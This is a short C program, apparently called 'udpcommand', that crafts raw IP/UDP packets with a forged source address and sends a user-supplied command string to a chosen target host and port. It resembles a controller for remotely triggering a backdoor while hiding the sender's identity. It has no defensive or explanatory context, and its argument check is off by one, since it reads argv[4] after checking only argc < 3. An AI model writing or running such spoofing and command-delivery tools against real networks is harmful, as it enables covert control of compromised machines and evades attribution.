#include <stdio.h>
#include <signal.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

unsigned short ip_sum( void *addr, int len )
{
    register int nleft 	= len;
    register u_short *w = ( u_short * )addr;
    register int sum 	= 0;
    u_short answer	= 0;
    
    while( nleft > 1 )
    {
	sum 	+= *w++;
	nleft 	-= 2;
    }
    
    if( nleft == 1 )
    {
	*( u_char * )( &answer ) = *( u_char * )w;
	sum += answer;
    }
    
    sum		=  ( sum >> 16 ) + ( sum & 0xffff );
    sum 	+= ( sum >> 16 );
    answer 	=  ~sum;
    
    return answer;
}

int main( int argc, char *argv[] )
{
    struct hostent *hep;
    int s, dport;
    unsigned long daddr, saddr;    
    struct iphdr ih, *pih;
    struct udphdr th, *puh;
    struct sockaddr_in sin;
    char buf[0xffff], *data;
    int one = 1;
    int dlen;

    printf( "udpcommand /pm\n" );

    if( argc < 3 )
    {
	printf( "usage: %s <target> <port> <source> <command>\n", argv[0] );
	exit( 1 );
    }

    data = argv[4];
    dlen = strlen( data );
    
    memset( &buf, 0, 0xffff );
    memcpy( buf + sizeof( struct iphdr ) + sizeof( struct udphdr ), data, dlen );

    pih = ( struct iphdr * )buf;
    puh = ( struct udphdr * )( buf + sizeof( struct iphdr ) );
        
    dport = atoi( argv[2] );
    saddr = inet_addr( argv[3] );
    daddr = inet_addr( argv[1] ); //fuck the resolve!
    
    if( ( s = socket( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) < 0 )
    {
	perror( "socket" );
	exit( 1 );
    }
    
    if( setsockopt( s, IPPROTO_IP, IP_HDRINCL, &one, sizeof( int ) ) < 0 )
    {
	fprintf( stderr, "warning! can't set HDRINCL!\n" );
    }

    pih->version	= 4;
    pih->ihl		= 5;
    pih->tot_len	= sizeof( struct iphdr ) + sizeof( struct udphdr ) + dlen;
    pih->id		= htons( 0x2301 );//htons( random() );
    pih->ttl		= 30;
    pih->protocol	= IPPROTO_UDP;
    pih->saddr		= saddr;
    pih->daddr		= daddr;
	
    puh->source		= htons( 3045 ); //1024 + ( rand() % ( 65536 - 1024) );
    puh->dest		= htons( dport );
    puh->len		= htons( sizeof( struct udphdr ) + dlen );
		 
    pih->check = ip_sum( pih, sizeof( struct iphdr ) & ~1 );

    sin.sin_family	= AF_INET;
    sin.sin_port	= htons( dport );
    sin.sin_addr.s_addr = daddr;

    if( sendto(
    
        s,
        buf, 
        sizeof( struct iphdr ) + sizeof( struct udphdr ) + dlen,
        0, 
        &sin, 
        sizeof( struct sockaddr_in )
	
    ) < 0 )
    {
        perror( "sendto" );
    }
	
    close( s );
    return( 0 );
}
